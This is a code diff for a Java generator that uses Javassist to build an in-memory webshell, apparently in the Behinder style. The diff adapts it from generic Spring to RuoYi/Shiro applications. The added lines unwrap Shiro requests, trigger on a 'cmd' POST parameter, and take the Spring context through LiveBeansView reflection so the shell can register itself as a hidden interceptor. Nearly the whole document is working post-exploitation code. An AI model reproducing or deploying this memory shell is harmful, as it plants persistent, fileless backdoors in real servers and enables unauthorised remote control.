@@ -1,11 +1,11 @@
-package org.memshell.spring;
+package org.memshell.ruoyi;
 
 import javassist.*;
 
 import java.io.IOException;
 import java.util.UUID;
 
-public class SpringInterceptorBehinder {
+public class RuoYiSpringInterceptorBehinder {
     public static byte[] generateListenerMemShell(String path) throws CannotCompileException, NotFoundException, IOException {
         //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
         UUID uuid = UUID.randomUUID();
@@ -37,9 +37,10 @@ public class SpringInterceptorBehinder {
         ctClass.addMethod(transform1);
 
         // 创建preHandle方法
-        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(javax.servlet.http.HttpServletRequest req, javax.servlet.http.HttpServletResponse resp, java.lang.Object handler) throws Exception {\n" +
-                "   if (req.getMethod().equals(\"POST\")) {\n" +
-                "       java.lang.reflect.Field requestField = ((org.apache.catalina.connector.RequestFacade) req).getClass().getDeclaredField(\"request\");\n" +
+        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(javax.servlet.http.HttpServletRequest req1, javax.servlet.http.HttpServletResponse resp, java.lang.Object handler) throws Exception {\n" +
+                "   if (!req1.getParameter(\"cmd\").isEmpty() && req1.getMethod().equals(\"POST\")) {\n" +
+                "       org.apache.catalina.connector.RequestFacade req = (org.apache.catalina.connector.RequestFacade) ((org.apache.shiro.web.servlet.ShiroHttpServletRequest) req1).getRequest();\n" +
+                "       java.lang.reflect.Field requestField = req.getClass().getDeclaredField(\"request\");\n" +
                 "       requestField.setAccessible(true);" +
                 "       org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestField.get(req);\n" +
                 "       org.apache.catalina.connector.Response response = request.getResponse();\n" +
@@ -66,7 +67,11 @@ public class SpringInterceptorBehinder {
         ctClass.addMethod(preHandle);
 
         ctClass.makeClassInitializer().insertBefore("try {\n" +
-                "   org.springframework.web.context.WebApplicationContext webApplicationContext = (org.springframework.web.context.WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
+                "   java.lang.reflect.Field filed = Class.forName(\"org.springframework.context.support.LiveBeansView\").getDeclaredField(\"applicationContexts\");\n" +
+                "   System.out.println(filed);\n" +
+                "   filed.setAccessible(true);\n" +
+                "   org.springframework.web.context.WebApplicationContext webApplicationContext =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();\n" +
+                "   System.out.println(webApplicationContext);\n" +
                 "   org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"requestMappingHandlerMapping\");\n" +
                 "   java.lang.reflect.Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                 "   adaptedInterceptorsField.setAccessible(true);\n" +
@@ -81,7 +86,7 @@ public class SpringInterceptorBehinder {
                 "   e.printStackTrace();\n" +
                 "}");
 
-
+//        ctClass.writeFile("./output");
         return ctClass.toBytecode();
     }
 }
